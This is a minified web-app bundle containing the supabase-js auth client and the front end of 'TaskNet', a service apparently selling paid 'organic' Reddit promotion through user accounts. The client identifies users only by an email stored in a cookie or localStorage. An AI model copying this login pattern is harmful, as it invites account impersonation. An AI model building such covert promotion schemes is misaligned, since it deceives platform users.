as(this.userStorage,this.storageKey+"-user");!this.storage.isServer&&Object.is(this.storage,this.userStorage)&&!l&&(l={user:a.user},await Is(this.userStorage,this.storageKey+"-user",l)),a.user=(t=l==null?void 0:l.user)!==null&&t!==void 0?t:lo()}else if(a&&!a.user&&!a.user){const l=await as(this.storage,this.storageKey+"-user");l&&(l!=null&&l.user)?(a.user=l.user,await Ue(this.storage,this.storageKey+"-user"),await Is(this.storage,this.storageKey,a)):a.user=lo()}if(this._debug(s,"session from storage",a),!this._isValidSession(a)){this._debug(s,"session is not valid"),a!==null&&await this._removeSession();return}const i=((r=a.expires_at)!==null&&r!==void 0?r:1/0)*1e3-Date.now()<no;if(this._debug(s,`session has${i?"":" not"} expired with margin of ${no}s`),i){if(this.autoRefreshToken&&a.refresh_token){const{error:l}=await this._callRefreshToken(a.refresh_token);l&&(console.error(l),ao(l)||(this._debug(s,"refresh failed with a non-retryable error, removing the session",l),await this._removeSession()))}}else if(a.user&&a.user.__isUserNotAvailableProxy===!0)try{const{data:l,error:o}=await this._getUser(a.access_token);!o&&(l!=null&&l.user)?(a.user=l.user,await this._saveSession(a),await this._notifyAllSubscribers("SIGNED_IN",a)):this._debug(s,"could not get user data, skipping SIGNED_IN notification")}catch(l){console.error("Error getting user data:",l),this._debug(s,"error getting user data, skipping SIGNED_IN notification",l)}else await this._notifyAllSubscribers("SIGNED_IN",a)}catch(a){this._debug(s,"error",a),console.error(a);return}finally{this._debug(s,"end")}}async _callRefreshToken(t){var r,s;if(!t)throw new ot;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const a=`#_callRefreshToken(${t.substring(0,5)}...)`;this._debug(a,"begin");try{this.refreshingDeferred=new dl;const{data:i,error:l}=await this._refreshAccessToken(t);if(l)throw l;if(!i.session)throw new ot;await this._saveSession(i.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",i.session);const o={data:i.session,error:null};return this.refreshingDeferred.resolve(o),o}catch(i){if(this._debug(a,"error",i),M(i)){const l={data:null,error:i};return ao(i)||await this._removeSession(),(r=this.refreshingDeferred)===null||r===void 0||r.resolve(l),l}throw(s=this.refreshingDeferred)===null||s===void 0||s.reject(i),i}finally{this.refreshingDeferred=null,this._debug(a,"end")}}async _notifyAllSubscribers(t,r,s=!0){const a=`#_notifyAllSubscribers(${t})`;this._debug(a,"begin",r,`broadcast = ${s}`);try{this.broadcastChannel&&s&&this.broadcastChannel.postMessage({event:t,session:r});const i=[],l=Array.from(this.stateChangeEmitters.values()).map(async o=>{try{await o.callback(t,r)}catch(c){i.push(c)}});if(await Promise.all(l),i.length>0){for(let o=0;o<i.length;o+=1)console.error(i[o]);throw i[0]}}finally{this._debug(a,"end")}}async _saveSession(t){this._debug("#_saveSession()",t),this.suppressGetSessionWarning=!0,await Ue(this.storage,`${this.storageKey}-code-verifier`);const r=Object.assign({},t),s=r.user&&r.user.__isUserNotAvailableProxy===!0;if(this.userStorage){!s&&r.user&&await Is(this.userStorage,this.storageKey+"-user",{user:r.user});const a=Object.assign({},r);delete a.user;const i=dh(a);await Is(this.storage,this.storageKey,i)}else{const a=dh(r);await Is(this.storage,this.storageKey,a)}}async _removeSession(){this._debug("#_removeSession()"),this.suppressGetSessionWarning=!1,await Ue(this.storage,this.storageKey),await Ue(this.storage,this.storageKey+"-code-verifier"),await Ue(this.storage,this.storageKey+"-user"),this.userStorage&&await Ue(this.userStorage,this.storageKey+"-user"),await this._notifyAllSubscribers("SIGNED_OUT",null)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const t=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{t&&De()&&(window!=null&&window.removeEventListener)&&window.removeEventListener("visibilitychange",t)}catch(r){console.error("removing visibilitychange callback failed",r)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const t=setInterval(()=>this._autoRefreshTokenTick(),Os);this.autoRefreshTicker=t,t&&typeof t=="object"&&typeof t.unref=="function"?t.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(t);const r=setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0);this.autoRefreshTickTimeout=r,r&&typeof r=="object"&&typeof r.unref=="function"?r.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(r)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const t=this.autoRefreshTicker;this.autoRefreshTicker=null,t&&clearInterval(t);const r=this.autoRefreshTickTimeout;this.autoRefreshTickTimeout=null,r&&clearTimeout(r)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const t=Date.now();try{return await this._useSession(async r=>{const{data:{session:s}}=r;if(!s||!s.refresh_token||!s.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const a=Math.floor((s.expires_at*1e3-t)/Os);this._debug("#_autoRefreshTokenTick()",`access token expires in ${a} ticks, a tick lasts ${Os}ms, refresh threshold is ${xc} ticks`),a<=xc&&await this._callRefreshToken(s.refresh_token)})}catch(r){console.error("Auto refresh tick failed with error. This is likely a transient error.",r)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(t){if(t.isAcquireTimeout||t instanceof lp)this._debug("auto refresh token tick lock not available");else throw t}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!De()||!(window!=null&&window.addEventListener))return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window==null||window.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(t){console.error("_handleVisibilityChange",t)}}async _onVisibilityChanged(t){const r=`#_onVisibilityChanged(${t})`;this._debug(r,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),t||(await this.initializePromise,await this._acquireLock(this.lockAcquireTimeout,async()=>{if(document.visibilityState!=="visible"){this._debug(r,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(t,r,s){const a=[`provider=${encodeURIComponent(r)}`];if(s!=null&&s.redirectTo&&a.push(`redirect_to=${encodeURIComponent(s.redirectTo)}`),s!=null&&s.scopes&&a.push(`scopes=${encodeURIComponent(s.scopes)}`),this.flowType==="pkce"){const[i,l]=await Cs(this.storage,this.storageKey),o=new URLSearchParams({code_challenge:`${encodeURIComponent(i)}`,code_challenge_method:`${encodeURIComponent(l)}`});a.push(o.toString())}if(s!=null&&s.queryParams){const i=new URLSearchParams(s.queryParams);a.push(i.toString())}return s!=null&&s.skipBrowserRedirect&&a.push(`skip_http_redirect=${s.skipBrowserRedirect}`),`${t}?${a.join("&")}`}async _unenroll(t){try{return await this._useSession(async r=>{var s;const{data:a,error:i}=r;return i?this._returnResult({data:null,error:i}):await V(this.fetch,"DELETE",`${this.url}/factors/${t.factorId}`,{headers:this.headers,jwt:(s=a==null?void 0:a.session)===null||s===void 0?void 0:s.access_token})})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}}async _enroll(t){try{return await this._useSession(async r=>{var s,a;const{data:i,error:l}=r;if(l)return this._returnResult({data:null,error:l});const o=Object.assign({friendly_name:t.friendlyName,factor_type:t.factorType},t.factorType==="phone"?{phone:t.phone}:t.factorType==="totp"?{issuer:t.issuer}:{}),{data:c,error:u}=await V(this.fetch,"POST",`${this.url}/factors`,{body:o,headers:this.headers,jwt:(s=i==null?void 0:i.session)===null||s===void 0?void 0:s.access_token});return u?this._returnResult({data:null,error:u}):(t.factorType==="totp"&&c.type==="totp"&&(!((a=c==null?void 0:c.totp)===null||a===void 0)&&a.qr_code)&&(c.totp.qr_code=`data:image/svg+xml;utf-8,${c.totp.qr_code}`),this._returnResult({data:c,error:null}))})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}}async _verify(t){return this._acquireLock(this.lockAcquireTimeout,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:i}=r;if(i)return this._returnResult({data:null,error:i});const l=Object.assign({challenge_id:t.challengeId},"webauthn"in t?{webauthn:Object.assign(Object.assign({},t.webauthn),{credential_response:t.webauthn.type==="create"?iw(t.webauthn.credential_response):lw(t.webauthn.credential_response)})}:{code:t.code}),{data:o,error:c}=await V(this.fetch,"POST",`${this.url}/factors/${t.factorId}/verify`,{body:l,headers:this.headers,jwt:(s=a==null?void 0:a.session)===null||s===void 0?void 0:s.access_token});return c?this._returnResult({data:null,error:c}):(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+o.expires_in},o)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",o),this._returnResult({data:o,error:c}))})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}})}async _challenge(t){return this._acquireLock(this.lockAcquireTimeout,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:i}=r;if(i)return this._returnResult({data:null,error:i});const l=await V(this.fetch,"POST",`${this.url}/factors/${t.factorId}/challenge`,{body:t,headers:this.headers,jwt:(s=a==null?void 0:a.session)===null||s===void 0?void 0:s.access_token});if(l.error)return l;const{data:o}=l;if(o.type!=="webauthn")return{data:o,error:null};switch(o.webauthn.type){case"create":return{data:Object.assign(Object.assign({},o),{webauthn:Object.assign(Object.assign({},o.webauthn),{credential_options:Object.assign(Object.assign({},o.webauthn.credential_options),{publicKey:nw(o.webauthn.credential_options.publicKey)})})}),error:null};case"request":return{data:Object.assign(Object.assign({},o),{webauthn:Object.assign(Object.assign({},o.webauthn),{credential_options:Object.assign(Object.assign({},o.webauthn.credential_options),{publicKey:aw(o.webauthn.credential_options.publicKey)})})}),error:null}}})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}})}async _challengeAndVerify(t){const{data:r,error:s}=await this._challenge({factorId:t.factorId});return s?this._returnResult({data:null,error:s}):await this._verify({factorId:t.factorId,challengeId:r.id,code:t.code})}async _listFactors(){var t;const{data:{user:r},error:s}=await this.getUser();if(s)return{data:null,error:s};const a={all:[],phone:[],totp:[],webauthn:[]};for(const i of(t=r==null?void 0:r.factors)!==null&&t!==void 0?t:[])a.all.push(i),i.status==="verified"&&a[i.factor_type].push(i);return{data:a,error:null}}async _getAuthenticatorAssuranceLevel(){var t,r;const{data:{session:s},error:a}=await this.getSession();if(a)return this._returnResult({data:null,error:a});if(!s)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const{payload:i}=io(s.access_token);let l=null;i.aal&&(l=i.aal);let o=l;((r=(t=s.user.factors)===null||t===void 0?void 0:t.filter(h=>h.status==="verified"))!==null&&r!==void 0?r:[]).length>0&&(o="aal2");const u=i.amr||[];return{data:{currentLevel:l,nextLevel:o,currentAuthenticationMethods:u},error:null}}async _getAuthorizationDetails(t){try{return await this._useSession(async r=>{const{data:{session:s},error:a}=r;return a?this._returnResult({data:null,error:a}):s?await V(this.fetch,"GET",`${this.url}/oauth/authorizations/${t}`,{headers:this.headers,jwt:s.access_token,xform:i=>({data:i,error:null})}):this._returnResult({data:null,error:new ot})})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}}async _approveAuthorization(t,r){try{return await this._useSession(async s=>{const{data:{session:a},error:i}=s;if(i)return this._returnResult({data:null,error:i});if(!a)return this._returnResult({data:null,error:new ot});const l=await V(this.fetch,"POST",`${this.url}/oauth/authorizations/${t}/consent`,{headers:this.headers,jwt:a.access_token,body:{action:"approve"},xform:o=>({data:o,error:null})});return l.data&&l.data.redirect_url&&De()&&!(r!=null&&r.skipBrowserRedirect)&&window.location.assign(l.data.redirect_url),l})}catch(s){if(M(s))return this._returnResult({data:null,error:s});throw s}}async _denyAuthorization(t,r){try{return await this._useSession(async s=>{const{data:{session:a},error:i}=s;if(i)return this._returnResult({data:null,error:i});if(!a)return this._returnResult({data:null,error:new ot});const l=await V(this.fetch,"POST",`${this.url}/oauth/authorizations/${t}/consent`,{headers:this.headers,jwt:a.access_token,body:{action:"deny"},xform:o=>({data:o,error:null})});return l.data&&l.data.redirect_url&&De()&&!(r!=null&&r.skipBrowserRedirect)&&window.location.assign(l.data.redirect_url),l})}catch(s){if(M(s))return this._returnResult({data:null,error:s});throw s}}async _listOAuthGrants(){try{return await this._useSession(async t=>{const{data:{session:r},error:s}=t;return s?this._returnResult({data:null,error:s}):r?await V(this.fetch,"GET",`${this.url}/user/oauth/grants`,{headers:this.headers,jwt:r.access_token,xform:a=>({data:a,error:null})}):this._returnResult({data:null,error:new ot})})}catch(t){if(M(t))return this._returnResult({data:null,error:t});throw t}}async _revokeOAuthGrant(t){try{return await this._useSession(async r=>{const{data:{session:s},error:a}=r;return a?this._returnResult({data:null,error:a}):s?(await V(this.fetch,"DELETE",`${this.url}/user/oauth/grants`,{headers:this.headers,jwt:s.access_token,query:{client_id:t.clientId},noResolveJson:!0}),{data:{},error:null}):this._returnResult({data:null,error:new ot})})}catch(r){if(M(r))return this._returnResult({data:null,error:r});throw r}}async fetchJwk(t,r={keys:[]}){let s=r.keys.find(o=>o.kid===t);if(s)return s;const a=Date.now();if(s=this.jwks.keys.find(o=>o.kid===t),s&&this.jwks_cached_at+mv>a)return s;const{data:i,error:l}=await V(this.fetch,"GET",`${this.url}/.well-known/jwks.json`,{headers:this.headers});if(l)throw l;return!i.keys||i.keys.length===0||(this.jwks=i,this.jwks_cached_at=a,s=i.keys.find(o=>o.kid===t),!s)?null:s}async getClaims(t,r={}){try{let s=t;if(!s){const{data:v,error:f}=await this.getSession();if(f||!v.session)return this._returnResult({data:null,error:f});s=v.session.access_token}const{header:a,payload:i,signature:l,raw:{header:o,payload:c}}=io(s);r!=null&&r.allowExpired||Lv(i.exp);const u=!a.alg||a.alg.startsWith("HS")||!a.kid||!("crypto"in globalThis&&"subtle"in globalThis.crypto)?null:await this.fetchJwk(a.kid,r!=null&&r.keys?{keys:r.keys}:r==null?void 0:r.jwks);if(!u){const{error:v}=await this.getUser(s);if(v)throw v;return{data:{claims:i,header:a,signature:l},error:null}}const h=Uv(a.alg),p=await crypto.subtle.importKey("jwk",u,h,!0,["verify"]);if(!await crypto.subtle.verify(h,p,l,_v(`${o}.${c}`)))throw new vc("Invalid JWT signature");return{data:{claims:i,header:a,signature:l},error:null}}catch(s){if(M(s))return this._returnResult({data:null,error:s});throw s}}}wa.nextInstanceID={};const xw=wa,gw="2.90.1";let Un="";typeof Deno<"u"?Un="deno":typeof document<"u"?Un="web":typeof navigator<"u"&&navigator.product==="ReactNative"?Un="react-native":Un="node";const yw={"X-Client-Info":`supabase-js-${Un}/${gw}`},vw={headers:yw},ww={schema:"public"},bw={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},jw={};function ba(e){"@babel/helpers - typeof";return ba=typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?function(t){return typeof t}:function(t){return t&&typeof Symbol=="function"&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},ba(e)}function kw(e,t){if(ba(e)!="object"||!e)return e;var r=e[Symbol.toPrimitive];if(r!==void 0){var s=r.call(e,t);if(ba(s)!="object")return s;throw new TypeError("@@toPrimitive must return a primitive value.")}return(t==="string"?String:Number)(e)}function _w(e){var t=kw(e,"string");return ba(t)=="symbol"?t:t+""}function Nw(e,t,r){return(t=_w(t))in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function yh(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);t&&(s=s.filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable})),r.push.apply(r,s)}return r}function ke(e){for(var t=1;t<arguments.length;t++){var r=arguments[t]!=null?arguments[t]:{};t%2?yh(Object(r),!0).forEach(function(s){Nw(e,s,r[s])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):yh(Object(r)).forEach(function(s){Object.defineProperty(e,s,Object.getOwnPropertyDescriptor(r,s))})}return e}const Sw=e=>e?(...t)=>e(...t):(...t)=>fetch(...t),Ew=()=>Headers,Cw=(e,t,r)=>{const s=Sw(r),a=Ew();return async(i,l)=>{var o;const c=(o=await t())!==null&&o!==void 0?o:e;let u=new a(l==null?void 0:l.headers);return u.has("apikey")||u.set("apikey",e),u.has("Authorization")||u.set("Authorization",`Bearer ${c}`),s(i,ke(ke({},l),{},{headers:u}))}};function Tw(e){return e.endsWith("/")?e:e+"/"}function Rw(e,t){var r,s;const{db:a,auth:i,realtime:l,global:o}=e,{db:c,auth:u,realtime:h,global:p}=t,x={db:ke(ke({},c),a),auth:ke(ke({},u),i),realtime:ke(ke({},h),l),storage:{},global:ke(ke(ke({},p),o),{},{headers:ke(ke({},(r=p==null?void 0:p.headers)!==null&&r!==void 0?r:{}),(s=o==null?void 0:o.headers)!==null&&s!==void 0?s:{})}),accessToken:async()=>""};return e.accessToken?x.accessToken=e.accessToken:delete x.accessToken,x}function Pw(e){const t=e==null?void 0:e.trim();if(!t)throw new Error("supabaseUrl is required.");if(!t.match(/^https?:\/\//i))throw new Error("Invalid supabaseUrl: Must be a valid HTTP or HTTPS URL.");try{return new URL(Tw(t))}catch{throw Error("Invalid supabaseUrl: Provided URL is malformed.")}}var Aw=class extends xw{constructor(e){super(e)}},Ow=class{constructor(e,t,r){var s,a;this.supabaseUrl=e,this.supabaseKey=t;const i=Pw(e);if(!t)throw new Error("supabaseKey is required.");this.realtimeUrl=new URL("realtime/v1",i),this.realtimeUrl.protocol=this.realtimeUrl.protocol.replace("http","ws"),this.authUrl=new URL("auth/v1",i),this.storageUrl=new URL("storage/v1",i),this.functionsUrl=new URL("functions/v1",i);const l=`sb-${i.hostname.split(".")[0]}-auth-token`,o={db:ww,realtime:jw,auth:ke(ke({},bw),{},{storageKey:l}),global:vw},c=Rw(r??{},o);if(this.storageKey=(s=c.auth.storageKey)!==null&&s!==void 0?s:"",this.headers=(a=c.global.headers)!==null&&a!==void 0?a:{},c.accessToken)this.accessToken=c.accessToken,this.auth=new Proxy({},{get:(h,p)=>{throw new Error(`@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.${String(p)} is not possible`)}});else{var u;this.auth=this._initSupabaseAuthClient((u=c.auth)!==null&&u!==void 0?u:{},this.headers,c.global.fetch)}this.fetch=Cw(t,this._getAccessToken.bind(this),c.global.fetch),this.realtime=this._initRealtimeClient(ke({headers:this.headers,accessToken:this._getAccessToken.bind(this)},c.realtime)),this.accessToken&&this.accessToken().then(h=>this.realtime.setAuth(h)).catch(h=>console.warn("Failed to set initial Realtime auth token:",h)),this.rest=new hy(new URL("rest/v1",i).href,{headers:this.headers,schema:c.db.schema,fetch:this.fetch}),this.storage=new cv(this.storageUrl.href,this.headers,this.fetch,r==null?void 0:r.storage),c.accessToken||this._listenForAuthEvents()}get functions(){return new ly(this.functionsUrl.href,{headers:this.headers,customFetch:this.fetch})}from(e){return this.rest.from(e)}schema(e){return this.rest.schema(e)}rpc(e,t={},r={head:!1,get:!1,count:void 0}){return this.rest.rpc(e,t,r)}channel(e,t={config:{}}){return this.realtime.channel(e,t)}getChannels(){return this.realtime.getChannels()}removeChannel(e){return this.realtime.removeChannel(e)}removeAllChannels(){return this.realtime.removeAllChannels()}async _getAccessToken(){var e=this,t,r;if(e.accessToken)return await e.accessToken();const{data:s}=await e.auth.getSession();return(t=(r=s.session)===null||r===void 0?void 0:r.access_token)!==null&&t!==void 0?t:e.supabaseKey}_initSupabaseAuthClient({autoRefreshToken:e,persistSession:t,detectSessionInUrl:r,storage:s,userStorage:a,storageKey:i,flowType:l,lock:o,debug:c,throwOnError:u},h,p){const x={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new Aw({url:this.authUrl.href,headers:ke(ke({},x),h),storageKey:i,autoRefreshToken:e,persistSession:t,detectSessionInUrl:r,storage:s,userStorage:a,flowType:l,lock:o,debug:c,throwOnError:u,fetch:p,hasCustomAuthorizationHeader:Object.keys(this.headers).some(v=>v.toLowerCase()==="authorization")})}_initRealtimeClient(e){return new Ty(this.realtimeUrl.href,ke(ke({},e),{},{params:ke(ke({},{apikey:this.supabaseKey}),e==null?void 0:e.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((e,t)=>{this._handleTokenChanged(e,"CLIENT",t==null?void 0:t.access_token)})}_handleTokenChanged(e,t,r){(e==="TOKEN_REFRESHED"||e==="SIGNED_IN")&&this.changedAccessToken!==r?(this.changedAccessToken=r,this.realtime.setAuth(r)):e==="SIGNED_OUT"&&(this.realtime.setAuth(),t=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}};const Iw=(e,t,r)=>new Ow(e,t,r);function $w(){if(typeof window<"u")return!1;const e=globalThis.process;if(!e)return!1;const t=e.version;if(t==null)return!1;const r=t.match(/^v(\d+)\./);return r?parseInt(r[1],10)<=18:!1}$w()&&console.warn("  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217");const zw="https://ekbhneculhhzkwvqvbke.supabase.co",Lw="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVrYmhuZWN1bGhoemt3dnF2YmtlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTIyNjMsImV4cCI6MjA4NDU4ODI2M30.dw5o6uor7PC7j9aGMnP-3Jt6U07SJjEkj3peQbjyr3U",z=Iw(zw,Lw),wc=(e,t,r=30)=>{const s=encodeURIComponent(t),a=new Date;a.setTime(a.getTime()+r*24*60*60*1e3);const i=window.location.protocol==="https:"?";Secure":"";document.cookie=`${e}=${s};expires=${a.toUTCString()};path=/;SameSite=Strict${i}`},ft=e=>{const t=e+"=",r=document.cookie.split(";");for(let s=0;s<r.length;s++){let a=r[s];for(;a.charAt(0)===" ";)a=a.substring(1,a.length);if(a.indexOf(t)===0){const i=a.substring(t.length,a.length);return decodeURIComponent(i)}}return null},Uw=e=>{document.cookie=`${e}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;`,localStorage.removeItem(e)},Dw=e=>{const t=ft(e);t&&wc(e,t,30)},Mw=()=>{const e=St();return ft("user_email")||localStorage.getItem("user_email")?n.jsx(vu,{to:"/",replace:!0}):n.jsxs("div",{className:"min-h-screen bg-black text-white selection:bg-blue-600",children:[n.jsxs("div",{className:"fixed inset-0 overflow-hidden pointer-events-none",children:[n.jsx("div",{className:"absolute top-[-10%] left-[-10%] w-[70%] h-[70%] rounded-full bg-blue-900/10 blur-[120px]"}),n.jsx("div",{className:"absolute bottom-[-10%] right-[-10%] w-[60%] h-[60%] rounded-full bg-blue-900/5 blur-[100px]"})]}),n.jsxs("nav",{className:"relative z-10 h-24 max-w-7xl mx-auto px-8 flex items-center justify-between",children:[n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("div",{className:"w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-600/20",children:n.jsx("svg",{viewBox:"0 0 24 24",className:"w-6 h-6 fill-white",xmlns:"http://www.w3.org/2000/svg",children:n.jsx("path",{d:"M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10zm4.5 13.5h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5z"})})}),n.jsx("span",{className:"text-2xl font-black tracking-tighter uppercase italic",children:"TaskNet"})]}),n.jsx("button",{onClick:()=>e("/login"),className:"px-8 py-3 bg-white/5 border border-white/10 rounded-2xl font-bold text-sm hover:bg-white/10 transition-all",children:"Sign In"})]}),n.jsxs("main",{className:"relative z-10 max-w-7xl mx-auto px-8 pt-20 pb-32",children:[n.jsxs("div",{className:"max-w-3xl",children:[n.jsxs("div",{className:"inline-flex items-center gap-2 px-4 py-2 bg-blue-600/10 border border-blue-500/20 rounded-full text-blue-500 text-xs font-bold uppercase tracking-widest mb-8 animate-in fade-in slide-in-from-bottom-4 duration-500",children:[n.jsxs("span",{className:"relative flex h-2 w-2",children:[n.jsx("span",{className:"animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"}),n.jsx("span",{className:"relative inline-flex rounded-full h-2 w-2 bg-blue-500"})]}),"Next-Gen Reddit Automation"]}),n.jsxs("h1",{className:"text-6xl md:text-8xl font-black tracking-tighter uppercase italic leading-[0.9] mb-8 animate-in fade-in slide-in-from-bottom-6 duration-700",children:["Empower Your ",n.jsx("span",{className:"text-blue-600",children:"Network"})," Influence."]}),n.jsxs("p",{className:"text-gray-400 text-lg md:text-xl max-w-2xl mb-12 animate-in fade-in slide-in-from-bottom-8 duration-1000 leading-relaxed",children:["Grow your business ",n.jsx("span",{className:"text-blue-500 font-black italic",children:"2x faster"})," by leveraging the power of organic Reddit advertising."]}),n.jsx("div",{className:"flex flex-col sm:flex-row gap-4 animate-in fade-in slide-in-from-bottom-10 duration-1000",children:n.jsxs("button",{onClick:()=>e("/login"),className:"px-10 py-5 bg-blue-600 text-white rounded-[24px] font-bold text-lg hover:bg-blue-700 transition-all shadow-2xl shadow-blue-600/40 flex items-center justify-center gap-3 group",children:["Get Started Now",n.jsx(wu,{size:20,className:"group-hover:translate-x-1 transition-transform"})]})})]}),n.jsx("div",{className:"mt-32 animate-in fade-in slide-in-from-bottom-12 duration-1000 delay-300",children:n.jsxs("div",{className:"p-12 bg-white/[0.02] border border-white/5 rounded-[40px] hover:border-blue-500/20 transition-all group text-center max-w-4xl mx-auto",children:[n.jsx("div",{className:"w-20 h-20 bg-blue-600/10 rounded-[24px] flex items-center justify-center mb-8 mx-auto group-hover:scale-110 transition-transform border border-blue-500/20",children:n.jsx(_u,{className:"text-blue-500",size:40})}),n.jsx("h3",{className:"text-4xl font-black mb-4 italic uppercase tracking-tighter",children:"Join Discord & Contact Admins"}),n.jsx("p",{className:"text-gray-400 text-xl font-medium leading-relaxed max-w-2xl mx-auto mb-8",children:"Want to scale your reach? Contact our administration team on Discord to build your custom advertisement campaign."}),n.jsx("button",{onClick:()=>window.open("https://discord.gg/ND296AgTyc","_blank"),className:"px-12 py-4 bg-white text-black rounded-2xl font-black text-sm uppercase tracking-[0.2em] hover:bg-blue-500 hover:text-white transition-all shadow-xl active:scale-[0.98]",children:"Open Discord Server"})]})})]}),n.jsx("footer",{className:"relative z-10 border-t border-white/5 py-12",children:n.jsxs("div",{className:"max-w-7xl mx-auto px-8 flex flex-col md:flex-row items-center justify-between gap-8 text-gray-600 text-xs font-bold uppercase tracking-widest",children:[n.jsx("p",{children:" 2026 TaskNet Infrastructure. All Rights Reserved."}),n.jsxs("div",{className:"flex gap-10",children:[n.jsx("button",{onClick:()=>e("/privacy"),className:"hover:text-white transition-colors",children:"Privacy Policy"}),n.jsx("button",{onClick:()=>e("/terms"),className:"hover:text-white transition-colors",children:"Terms of Service"}),n.jsx("a",{href:"https://discord.gg/3KUHvggF6k",target:"_blank",rel:"noreferrer",className:"hover:text-white transition-colors",children:"Contact Support"})]})]})})]})},Fw=()=>{var R;const e=St(),[t,r]=b.useState(!1),[s,a]=b.useState(null),[i,l]=b.useState(null),[o,c]=b.useState(null),[u,h]=b.useState(0),[p,x]=b.useState(!1),[v,f]=b.useState([]),w=ft("user_email")||localStorage.getItem("user_email")||"";b.useEffect(()=>{const T=L=>{if(p&&L.target instanceof Element){const $=L.target.closest(".alerts-modal"),G=L.target.closest(".bell-button");!$&&!G&&x(!1)}};return document.addEventListener("mousedown",T),()=>document.removeEventListener("mousedown",T)},[p]),b.useEffect(()=>{if(w){j(),y(),m();const T=z.channel("profile-changes").on("postgres_changes",{event:"UPDATE",schema:"public",table:"profiles",filter:`email=eq.${w}`},()=>{j()}).subscribe(),L=z.channel("alert-changes").on("postgres_changes",{event:"INSERT",schema:"public",table:"admin_alerts",filter:`user_email=eq.${w}`},()=>{y(),m()}).subscribe();return()=>{z.removeChannel(T),z.removeChannel(L)}}},[w]);const j=async()=>{try{const{data:T,error:L}=await z.from("profiles").select("server_username, reddit_username, balance").eq("email",w).single();if(L){const{data:$,error:G}=await z.from("profiles").select("server_username, reddit_username").eq("email",w).single();$&&(a({...$,balance:0}),$.reddit_username&&g($.reddit_username))}else T&&(a(T),T.reddit_username&&g(T.reddit_username))}catch{}},y=async()=>{const{count:T}=await z.from("admin_alerts").select("*",{count:"exact",head:!0}).eq("user_email",w).eq("is_read",!1);h(T||0)},m=async()=>{const{data:T,error:L}=await z.from("admin_alerts").select("*").eq("user_email",w).order("created_at",{ascending:!1});L||f(T||[])},g=async T=>{try{let L;try{L=await fetch(`https://www.reddit.com/user/${T}/about.json`,{headers:{Accept:"application/json"}})}catch{const G=`https://www.reddit.com/user/${T}/about.json`;L=await fetch(`https://corsproxy.io/?${encodeURIComponent(G)}`,{headers:{Accept:"application/json"}})}if(L.status===404)c("not_found");else if(L.status===403)c("suspended");else if(L.ok){const $=await L.json();if($&&$.data){const G=$.data;if(G.is_suspended===!0)c("suspended");else{c("active");const fe=G.total_karma??(G.link_karma+G.comment_karma||0);l(fe),z.from("profiles").update({reddit_karma:fe}).eq("email",w).then(({error:se})=>{})}}}else c("not_found")}catch{c("not_found")}},k=()=>{localStorage.removeItem("user_email"),Uw("user_email"),e("/welcome")},C=(s==null?void 